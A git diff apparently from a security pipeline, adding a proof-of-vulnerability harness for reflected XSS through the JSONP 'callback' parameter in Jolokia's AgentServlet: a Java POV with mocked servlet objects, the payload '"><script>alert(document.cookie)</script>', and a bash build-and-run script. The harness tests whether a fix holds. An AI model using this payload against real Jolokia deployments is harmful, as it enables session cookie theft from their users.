@@ -1,0 +1,248 @@
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$1.class b/.security-pipeline/pov/JolokiaJsonpXssPov$1.class
+new file mode 100644
+index 0000000..1157e27
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$1.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$2.class b/.security-pipeline/pov/JolokiaJsonpXssPov$2.class
+new file mode 100644
+index 0000000..6c3e8c8
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$2.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$3$1.class b/.security-pipeline/pov/JolokiaJsonpXssPov$3$1.class
+new file mode 100644
+index 0000000..1a7ed1a
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$3$1.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$3.class b/.security-pipeline/pov/JolokiaJsonpXssPov$3.class
+new file mode 100644
+index 0000000..78f3a51
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$3.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$4.class b/.security-pipeline/pov/JolokiaJsonpXssPov$4.class
+new file mode 100644
+index 0000000..bf950d7
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$4.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov$Defaults.class b/.security-pipeline/pov/JolokiaJsonpXssPov$Defaults.class
+new file mode 100644
+index 0000000..1033f8a
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov$Defaults.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov.class b/.security-pipeline/pov/JolokiaJsonpXssPov.class
+new file mode 100644
+index 0000000..13a257f
+Binary files /dev/null and b/.security-pipeline/pov/JolokiaJsonpXssPov.class differ
+diff --git a/.security-pipeline/pov/JolokiaJsonpXssPov.java b/.security-pipeline/pov/JolokiaJsonpXssPov.java
+new file mode 100644
+index 0000000..339f1dc
+--- /dev/null
++++ b/.security-pipeline/pov/JolokiaJsonpXssPov.java
+@@ -0,0 +1,172 @@
++import java.io.ByteArrayOutputStream;
++import java.io.IOException;
++import java.lang.reflect.InvocationHandler;
++import java.lang.reflect.Method;
++import java.lang.reflect.Proxy;
++import java.util.Collections;
++import java.util.Enumeration;
++
++import javax.servlet.ServletConfig;
++import javax.servlet.ServletContext;
++import javax.servlet.ServletOutputStream;
++import javax.servlet.http.HttpServletRequest;
++import javax.servlet.http.HttpServletResponse;
++
++import org.jolokia.http.AgentServlet;
++import org.jolokia.restrictor.AllowAllRestrictor;
++
++/**
++ * Proof-of-vulnerability for CWE-079 (Reflected XSS via JSONP callback) in Jolokia.
++ *
++ * The 'callback' request parameter flows unvalidated from
++ * AgentServlet.sendResponse(...) into IoUtil.streamResponseAndClose(...) which
++ * writes it verbatim before the JSON payload:  callback(<json>);
++ *
++ * This POV drives the real public entry point (AgentServlet.doGet) with a
++ * malicious callback and checks whether the attacker-controlled script markup
++ * is reflected verbatim, unescaped, at the very start of the HTTP response
++ * body (the JSONP wrapper signature).  On vulnerable code the payload is
++ * reflected -> exit 0.  A correct fix rejects / neutralises non-identifier
++ * callbacks so the payload is no longer reflected as a JSONP wrapper -> exit 1.
++ */
++public class JolokiaJsonpXssPov {
++
++    // A callback value that is NOT a legal JavaScript identifier and is a
++    // classic XSS breakout payload.
++    static final String MALICIOUS = "\"><script>alert(document.cookie)</script>";
++
++    // A JMX read request that is always serviceable inside the JVM.
++    static final String PATH_INFO = "/read/java.lang:type=Memory/HeapMemoryUsage";
++
++    public static void main(String[] args) throws Exception {
++        final ByteArrayOutputStream body = new ByteArrayOutputStream();
++
++        ServletConfig config = (ServletConfig) proxy(ServletConfig.class, new Defaults() {
++            public Object handle(Method m, Object[] a) throws Throwable {
++                String name = m.getName();
++                if (name.equals("getServletContext")) {
++                    return proxy(ServletContext.class, new Defaults());
++                }
++                if (name.equals("getServletName")) {
++                    return "jolokia";
++                }
++                return def(m);
++            }
++        });
++
++        HttpServletRequest request = (HttpServletRequest) proxy(HttpServletRequest.class, new Defaults() {
++            public Object handle(Method m, Object[] a) throws Throwable {
++                String name = m.getName();
++                if (name.equals("getParameter")) {
++                    String key = (String) a[0];
++                    if ("callback".equals(key)) {
++                        return MALICIOUS;
++                    }
++                    return null; // streaming / mimeType / etc -> defaults
++                }
++                if (name.equals("getPathInfo")) {
++                    return PATH_INFO;
++                }
++                if (name.equals("getRemoteHost")) {
++                    return "localhost";
++                }
++                if (name.equals("getRemoteAddr")) {
++                    return "127.0.0.1";
++                }
++                if (name.equals("getRequestURI")) {
++                    return "/jolokia/";
++                }
++                if (name.equals("getRequestURL")) {
++                    return new StringBuffer("http://localhost/jolokia");
++                }
++                if (name.equals("getContextPath")) {
++                    return "/jolokia/";
++                }
++                return def(m);
++            }
++        });
++
++        HttpServletResponse response = (HttpServletResponse) proxy(HttpServletResponse.class, new Defaults() {
++            public Object handle(Method m, Object[] a) throws Throwable {
++                if (m.getName().equals("getOutputStream")) {
++                    return new ServletOutputStream() {
++                        public void write(int b) throws IOException {
++                            body.write(b);
++                        }
++                    };
++                }
++                return def(m);
++            }
++        });
++
++        AgentServlet servlet = new AgentServlet(new AllowAllRestrictor());
++        boolean reflected = false;
++        String out = "";
++        try {
++            servlet.init(config);
++            Method doGet = AgentServlet.class.getDeclaredMethod(
++                    "doGet", HttpServletRequest.class, HttpServletResponse.class);
++            doGet.setAccessible(true);
++            doGet.invoke(servlet, request, response);
++            out = body.toString("UTF-8");
++            // The JSONP wrapper signature: response body begins with the raw,
++            // unescaped callback immediately followed by '(' and the JSON,
++            // ending with ');'. This is exactly the XSS injection point.
++            reflected = out.startsWith(MALICIOUS + "(")
++                    && out.contains("<script>alert(document.cookie)</script>")
++                    && out.trim().endsWith(");");
++        } catch (Throwable t) {
++            System.out.println("[pov] servlet flow raised: " + t);
++        } finally {
++            try { servlet.destroy(); } catch (Throwable ignore) { }
++        }
++
++        System.out.println("[pov] response body (first 160 chars): "
++                + out.substring(0, Math.min(160, out.length())));
++
++        if (reflected) {
++            System.out.println("[pov] VULNERABLE: malicious JSONP callback reflected unescaped -> reflected XSS (CWE-079)");
++            System.exit(0);
++        } else {
++            System.out.println("[pov] NOT REPRODUCED: malicious callback was not reflected as a JSONP wrapper (patched)");
++            System.exit(1);
++        }
++    }
++
++    static Object proxy(Class<?> iface, final Defaults h) {
++        return Proxy.newProxyInstance(iface.getClassLoader(), new Class[]{iface}, new InvocationHandler() {
++            public Object invoke(Object p, Method m, Object[] a) throws Throwable {
++                return h.handle(m, a);
++            }
++        });
++    }
++
++    static class Defaults {
++        public Object handle(Method m, Object[] a) throws Throwable {
++            return def(m);
++        }
++
++        Object def(Method m) {
++            String name = m.getName();
++            if (name.equals("getInitParameterNames") || name.equals("getParameterNames")
++                    || name.equals("getAttributeNames") || name.equals("getHeaderNames")
++                    || name.equals("getHeaders")) {
++                return Collections.enumeration(Collections.emptyList());
++            }
++            Class<?> r = m.getReturnType();
++            if (r.equals(boolean.class)) {
++                return Boolean.FALSE;
++            }
++            if (r.equals(int.class)) {
++                return Integer.valueOf(0);
++            }
++            if (r.equals(long.class)) {
++                return Long.valueOf(0L);
++            }
++            if (r.equals(Enumeration.class)) {
++                return Collections.enumeration(Collections.emptyList());
++            }
++            return null;
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..577fcd4
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/com/googlecode/json-simple/json-simple/1.1.1/json-simple-1.1.1.jar:/root/.m2/repository/javax/servlet/servlet-api/2.4/servlet-api-2.4.jar:/root/.m2/repository/org/jolokia/jolokia-test-util/1.4.0/jolokia-test-util-1.4.0.jar:/root/.m2/repository/org/testng/testng/6.8.8/testng-6.8.8.jar:/root/.m2/repository/org/beanshell/bsh/2.0b4/bsh-2.0b4.jar:/root/.m2/repository/com/beust/jcommander/1.27/jcommander-1.27.jar:/root/.m2/repository/org/easymock/easymock/3.0/easymock-3.0.jar:/root/.m2/repository/cglib/cglib-nodep/2.2/cglib-nodep-2.2.jar:/root/.m2/repository/org/objenesis/objenesis/1.2/objenesis-1.2.jar:/root/.m2/repository/org/jmockit/jmockit/1.8/jmockit-1.8.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..8c4e976
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,28 @@
++#!/usr/bin/env bash
++# Proof-of-vulnerability runner for the Jolokia JSONP callback XSS (CWE-079).
++# Runs inside /workspace/repo in the project container.
++# Exit 0  => vulnerable behaviour reproduced (unpatched code).
++# Exit !=0 => not reproduced (patched code).
++set -euo pipefail
++
++cd "$(dirname "$0")/../.."   # -> repo root (/workspace/repo)
++POV_DIR=".security-pipeline/pov"
++
++# 1. Build agent-core (+ its dependencies) so compiled classes are available.
++mvn -B -q -pl agent/core -am -DskipTests install >/tmp/pov_build.log 2>&1 || {
++  echo "[pov] build failed"; tail -n 40 /tmp/pov_build.log; exit 2;
++}
++
++# 2. Resolve the full runtime/provided classpath for agent-core.
++mvn -B -q -pl agent/core dependency:build-classpath \
++    -Dmdep.includeScope=test \
++    -Dmdep.outputFile="$PWD/$POV_DIR/cp.txt" >/tmp/pov_cp.log 2>&1 || {
++  echo "[pov] classpath resolution failed"; tail -n 40 /tmp/pov_cp.log; exit 2;
++}
++
++CORE_CLASSES="agent/core/target/classes"
++CP="$CORE_CLASSES:$(cat "$POV_DIR/cp.txt")"
++
++# 3. Compile and run the POV.
++javac -cp "$CP" -d "$POV_DIR" "$POV_DIR/JolokiaJsonpXssPov.java"
++java -cp "$CP:$POV_DIR" JolokiaJsonpXssPov
